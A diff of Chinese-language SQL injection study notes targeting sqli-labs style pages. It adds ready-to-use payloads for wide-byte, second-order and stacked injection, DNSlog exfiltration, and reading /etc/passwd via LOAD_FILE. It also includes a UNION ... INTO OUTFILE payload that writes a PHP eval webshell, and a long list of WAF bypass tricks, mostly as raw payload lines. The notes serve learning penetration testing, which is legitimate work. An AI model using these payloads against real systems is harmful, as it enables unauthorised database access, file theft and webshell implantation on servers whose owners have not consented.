@@ -1,4 +1,5 @@
-虽说现在有XIASQL\sqlmap，或者直接ai一把梭，但是什么、为什么、怎么做还是很有必要知道的。实际运用中，只需判断是否有注入点即可，也可深入判断是什么注入方式，再用sqlmap指定跑
+虽说现在有XIASQL\sqlmap，或者直接ai一把梭，但是什么、为什么、怎么做还是很有必要知道的。
+实际运用中，只需判断是否有注入点即可，也可深入判断是什么注入方式，再用sqlmap指定跑，也可以挂着xiasql插件以及bypass插件。
 
 先看三种型和对应后端代码  
 数字型  
@@ -132,6 +133,131 @@ https://www.runoob.com/w3cnote/ascii.html  码表
 http://www.mysql.com/Less-9/?id=1  
 ?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),3)--+  if第一个条件真，执行sleep(5) ，假则执行“3” 直接响应  
 
-五、 宽字节注入  
+五、 宽字节注入 （bypass过滤） 
+当打1'发现和1 没区别，可能'被过滤，这时就要尝试此方法绕过过滤，再进行前面的注入方式
 
+传入先使用过滤函数对传入数据进行过滤，当数据传入数据库进行代码执行时，前后编码不一致，这时数据库采用了宽字节编码。  
+由于编码的识别差异性这一特点，攻击者可以进行恶意构造，使其原本的闭合得以逃逸，从而可以被利用。  
 
+过滤函数如check_addslashes()会在' '' 等前面加 \ 来转义，使得'无法闭合  
+前后编码不一致指前端传入UTF-8，\ 编码为%5c ， 而数据库连接用GBK（宽字节） 而一个汉字占2字节，第一个字节大于 0x80 ，则会与下一字节合并  
+那么输入payload为 %df ' -> %df %5c' -> 汉字 '    //成功闭合
+
+http://www.mysql.com/Less-32/  
+?id=-1%df' union select 1,2,version()-- +  
+
+六、 二次注入  （注册功能点）
+数据在进行插入时，被过滤函数进行转义处理，导致恶意语句不能正常执行，但经过转义后的数据产生的 \ 不会被插入数据库中，  
+在下一次进行需要进行数据查询的时候，直接从数据库中取出了存在恶意代码的数据，没有进行进一步的检验和处理，直接被调用拼接到语句当中，二次调用产生注入  
+
+能把数据写进去可尝试此方法，如存在注册功能点，且对用户名没限制  
+实现流程：
+
+1）访问存在SQL二次注入的网站，并且已知此网站中一个真正存在的用户名：admin；  
+2）进入登录界面进行注册：用户名：admin'# ，密码：123456；    
+3）用新注册的用户和密码登录网站；  
+4）点击“忘记密码”对我们注册的用户名：admin'# 进行密码修改：1234；  
+5）此时如果网站中原本的admin用户使用此用户名和原本他自己设置的密码进行登录时，会显示密码错误，因为此时admin用户的密码已经被修改为1234了。(从数据库拿数据没有转义，直接拿admin' --，所以密码改的是admin的)
+** admin'-- (--后加一个空格) admin'#无需空格
+
+七、 堆叠注入  
+执行代码中，使用了可以执行一个或针对多个数据库的查询函数（也可执行删改）。  
+mysql中用;拼接多条sql语句  
+必须mysqli_multi_query()才支持，实际上用联合注入即可（条件允许的话）  
+
+-----
+自此，基本讲完了。接下来是扩展（很少）和bypass（重点）  
+1 DNSlog注入的本质  
+本质：  
+通过子查询，将内容拼接到域名内，利用load_file函数去访问共享文件，访问的域名记录被日志记录为报错信息，通过查询日志信息查看我们想要的数据。  
+利用条件：  
+1.需要在数据库中支持域名解析  
+2.需要数据库配置文件中设置secure_file_priv=''  
+3.支持UNC路径  
+4.目标服务器需要出网  
+
+2 前置条件  
+● 数据库权限：当前数据库用户必须拥有FILE权限。  
+SHOW GRANTS FOR CURRENT_USER;  
+● secure_file_priv 参数： ''（空）：可任意路径读写 NULL：禁止所有文件操作 指定路径：仅能在该目录下操作 SHOW VARIABLES LIKE 'secure_file_priv';  
+● 路径要求：必须知道服务器绝对路径，且路径需用单引号，不能用十六进制或CHAR()构造。  
+读取文件  
+利用 LOAD_FILE() 函数读取服务器上的文件：  
+?id=-1' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --+  
+常见目标文件：   
+● Linux系统用户信息：/etc/passwd  
+● 网站配置文件：/var/www/html/config.php  
+写入文件(WebShell)  
+使用 INTO OUTFILE 或 INTO DUMPFILE 写入PHP代码：  
+?id=-1' UNION SELECT 1,"<?php eval($_POST[x]);?>",3  
+INTO OUTFILE '/var/www/html/shell.php' --+   
+区别：  
+● OUTFILE：可多行输出，但会改变换行符格式  
+● DUMPFILE：单行输出，保持原格式  
+
+------
+BYPASS  
+从架构层面：  
+找到服务器真实IP，同网段绕过，http和https同时开放服务绕过，边缘资产漏洞利用绕过。  
+从协议层面：  
+分块延时传输，利用pipline绕过，利用协议未覆盖绕过，POST及GET提交绕过。  
+从规则层面：  
+编码绕过，等价符号替换绕过，普通注释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及静态资源绕过，文件格式绕过，参数污染等。  
+
+1 绕过空格字符过滤  
+某些防御的匹配规则可能会过滤掉含有空格的语句，此时可尝试将空格可以用其他字符代替
+
+两个空格代替一个空格，用 Tab 代替空格，%a0 在URL编码中等于空格  
+%20 %09 %0a %0b %0c %0d %a0 %00 /*/ /!*/  
+ select * from users where id=1 /*!union*//*!select*/1,2,3,4;  
+%09 TAB 键（水平） 
+%0a 新建一行  
+%0c 新的一页  
+%0d return 功能  
+%0b TAB 键（垂直）  
+%a0 空格  
+可以将空格字符替换成注释 /*/ 还可以使用 /!这里的根据 mysql 版本的内容  
+不注释*/  
+
+2 浮点数绕过  
+select * from users where id=8E0union select 1,2,3,4;  
+select * from users where id=8.0union select 1,2,3,4;  
+
+3 NULL值绕过  
+select * from users where id=\Nunion select 1,2,3,\N;  
+select * from users where id=\Nunion select 1,2,3,\Nfrom users;  
+
+4 绕过关键词过滤  
+4.1 大小写双写绕过  
+某些防御的匹配规则可能是某些关键词，但是匹配规则并不完善，可能不会过滤掉大小写同时存在的关键词，此时可以尝试使用大小写绕过  
+将字符串设置为大小写，例如 and 1=1 转成 AND 1=1 AnD 1=1  
+
+select * from users where id=1 UNION SELECT 1,2,3,4;  
+select * from users where id=1 UniON SelECT 1,2,3,4;  
+
+4.2 去重绕过  
+mysql 查询可以使用 distinct 去除查询的重复值。可以尝试利用这点绕过过滤  
+select * from users where id=-1 union distinct select 1,2,3,4 from users;  
+select * from users where id=-1 union distinct select 1,2,3,version() from users;  
+
+4.3 反引号绕过  
+在 mysql 可以使用 这里是反引号 绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。  
+select * from users where id=-1' union select 1,2,3,4 from `users`;  
+
+4.4 绕过 or and xor not 过滤  
+目前主流的 waf 都会对 id=1 and 1=2、id=1 or 1=2、id=0 or 1=2 id=0 xor 1=1 limit 1 、id=1 xor 1=2 这些常见的 SQL 注入检测语句进行拦截。  
+
+像 or and xor not这些还有字符代替  
+字符，字符如下  
+and 等于&&  
+or 等于 ||  
+not 等于 !  
+xor 等于|  
+所以可以转换成这样  
+id=1 and 1=1 等于 id=1 && 1=1  
+id=1 and 1=2 等于 id=1 && 1=2  
+id=1 or 1=1 等于 id=1 || 1=1  
+id=0 or 1=0 等于 id=0 || 1=0  
+而且在 1=1 的基础上，可添加运算符，例如  
+id=1 and 1=1-1   
+id=1 && 1=1-1  
